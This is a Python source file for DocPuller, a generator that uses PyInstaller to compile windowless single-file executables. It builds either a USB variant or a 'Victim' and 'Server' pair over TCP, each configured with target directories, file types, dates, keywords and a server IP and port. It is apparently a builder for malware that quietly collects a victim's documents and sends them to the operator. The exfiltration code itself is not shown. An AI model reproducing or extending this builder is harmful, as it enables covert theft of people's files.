import subprocess
from tkinter import Tk
from tkinter.filedialog import askdirectory
import sys

import PyInstaller as PyInstaller

from Generator.Modoles.fronzen_objects_geneartor import FrozenObjectGeneartor


class DocPullerGenerator:

    def __init__(self, save_dir, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.save_dir = save_dir
        self.is_usb = is_usb
        self.direcoties = direcoties
        self.file_type = file_type
        self.date = date
        self.keywords = keywords
        self.server_ip = server_ip
        self.server_port = server_port
        self.DOCPULLER_USB_EXE_PATH = r'C:\Users\ibena\Documents\GitHub\DocPuller\Generator\DocPullerScriptsToExe\DocPullerUSB_Exe.py'
        self.DOCPULLER_FTP_SERVER_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Server_Exe.py'
        self.DOCPULLER_FTP_VICTIM_EXE_PATH = 'Generator/DocPullerScriptsToExe/DocPullerTCP_Victim_Exe.py'

        # Specify additional PyInstaller options if needed
        self.options = [
            "--onefile",
            "--noconsole",
            f"--distpath={self.save_dir}"
        ]

        FrozenObjectGeneartor(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).main()

    def main(self):
        if self.is_usb:
            print('genarating exe')

            command = ["pyinstaller", self.DOCPULLER_USB_EXE_PATH] + self.options
            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             universal_newlines=True)
        else:
            command = ["pyinstaller", self.DOCPULLER_FTP_SERVER_EXE_PATH] + self.options
            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             universal_newlines=True)
            command = ["pyinstaller", self.DOCPULLER_FTP_VICTIM_EXE_PATH] + self.options
            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             universal_newlines=True)
